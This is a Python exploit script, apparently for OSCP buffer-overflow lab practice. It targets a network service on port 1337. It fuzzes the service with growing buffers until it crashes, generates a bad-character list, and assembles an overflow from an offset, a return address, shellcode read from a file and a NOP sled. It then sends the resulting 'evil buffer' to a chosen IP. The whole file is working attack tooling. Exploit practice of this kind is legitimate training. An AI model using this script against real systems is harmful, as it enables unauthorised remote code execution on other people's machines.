#!/usr/bin/python3

import socket
import argparse
from sys import exit
from time import sleep


class BufferOverFlowPrep:
    port = 1337
    charInFile = ""

    def __init__(self):
        parser = argparse.ArgumentParser(
            description="[+] Exploit to explorated that application oscp about  vulnerability BufferOverflow")
        parser.add_argument("-i", "--ip", help="[+] Please insert the ip to attack", type=str)
        parser.add_argument("-c", "--command", help="[+] Please insert the command to starting application", type=str)
        parser.add_argument("-off", "--offset", help="[+] Please insert the offset number", type=int,
                            default=0)
        parser.add_argument("-r", "--retn", help="[+] Please insert the next return ", type=str,
                            default="BBBB")
        parser.add_argument("-px", "--postifx", help="[+] Adding the postfix", action="store_true", default=False)
        parser.add_argument("-pld", "--payload", help="[+] Inform the file containing the content of the payload",
                            type=str)
        parser.add_argument("-t", "--timeout", help="[+] Set timeout", type=int, default=5)
        parser.add_argument("-f", "--fuzzer", help="[+] Executing fuzzer", default=False, action="store_true")
        parser.add_argument("-sB", "--send-buffer", help="[+] Send buffer and payload to target", default=False,
                            action="store_true")
        parser.add_argument("-bC", "--bad-char", help="[+] Create a list bad Char", default=False,
                            action="store_true")
        parser.add_argument("-rBC", "--remove-bad-char", help="[+] Create a list bad Char, example: '\x01,\x02\x03'", type=str)
        parser.add_argument("-nB", "--not-byte", help="[+] This flag recovers only the file content without transforming it into bytes", default=False,
                            action="store_true")
        self.args = parser.parse_args()

    def initialize(self):
        if self.args.bad_char:
            return self.badChar()
        if self.args.ip is not None or self.args.command is not None:
            if self.args.send_buffer:
                return self.initializeSendPayload()
            if self.args.fuzzer:
                return self.fuzzer()
        elif self.args.ip is None or self.args.command is None:
            print("[+] Is required flag -i and -c")
            exit(0)
        print(f"[+] You have to choose between '-f' or -'sB', enter the '-h' flag for more details, example: exploit.py -h")
        exit(0)

    @classmethod
    def badChar(cls):
        for x in range(1, 256):
            print("\\x" + "{:02x}".format(x), end="")

    def fuzzer(self):
        buff = self.args.command + " A" * 100
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                my_bytes = len(buff) - len(self.args.command)
                s.settimeout(self.args.timeout)
                s.connect((self.args.ip, self.port))
                s.recv(1024)
                try:
                    print(f"[+] Executing: {my_bytes}", end="\r")
                    s.send(bytes(buff, "latin-1"))
                    s.recv(1024)
                except Exception:
                    print(f"[+] Fuzzing crashed at {my_bytes} bytes")
                    exit(0)
                else:
                    buff += 100 * "A"
                    sleep(1)

    def initializeSendPayload(self):
        char = ""
        if self.args.payload is not None:
            char = (self.receivePayloadInFile())
            if self.args.remove_bad_char is not None:
                newChar = self.removeBadChar()
                char = newChar
        overflow = "A" * self.args.offset
        postfix = ""
        if self.args.postifx:
            postfix = "\x90" * 16
        retn = ""
        if self.args.retn != "BBBB":
            retn = self.convertRetn()
        elif self.args.offset > 0:
            retn = self.args.retn
        buffer = self.args.command + " " + overflow + retn + char + postfix
        #print(buffer)
        self.sendBuffer(buffer)

    def convertRetn(self):
        retn = self.args.retn.replace("\\", "0").split("0x")
        format_retn = ""
        for i in retn:
            if i:
                format_retn += bytes.fromhex(i).decode('latin-1')
        return format_retn

    def receivePayloadInFile(self):
        bytes_from_file = ""
        with open(self.args.payload, 'rb') as data:
            if self.args.not_byte:
                return data.read().decode().replace("\r", "").replace("\n", "")
            else:
                char = data.read().decode().replace("\\", "0").replace("\r", "").replace("\n", "").split("0x")
                self.charInFile = char
                for i in char:
                    try:
                        byte = bytes.fromhex(i)
                    except Exception as e:
                        print(f"Char: {i}")
                        print(f"Error: {e}")
                    bytes_from_file += byte.decode('latin-1')
                return bytes_from_file

    def removeBadChar(self):
        nothing_a_bad_char = []
        if "," in self.args.remove_bad_char:
            badChars = self.args.remove_bad_char.split(",")
            for i in self.charInFile:
                if i:
                    nothing_a_bad_char.append(bytes.fromhex(i))
            for badChar in badChars:
                if badChar:
                    bad = bytes.fromhex(badChar.replace("\\", "0").split("0x")[1])
                    nothing_a_bad_char.remove(bad)
            casting_bytes_to_char = ""
            for char in nothing_a_bad_char:
                casting_bytes_to_char += char.decode('latin-1')
            return casting_bytes_to_char
        else:
            print("[+] Please use the ',' delimiter to separate your badChars")
            exit(0)

    def sendBuffer(self, buffer):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.settimeout(10)
                s.connect((self.args.ip, self.port))
                print("[+] Sending evil buffer...")
                s.send(bytes(buffer + "\r\n", "latin-1"))
                print("[+] Done!")
            except Exception as e:
                print(f"[+] Could not connect: {e}.")


if __name__ == '__main__':
    BufferOverFlowPrep().initialize()
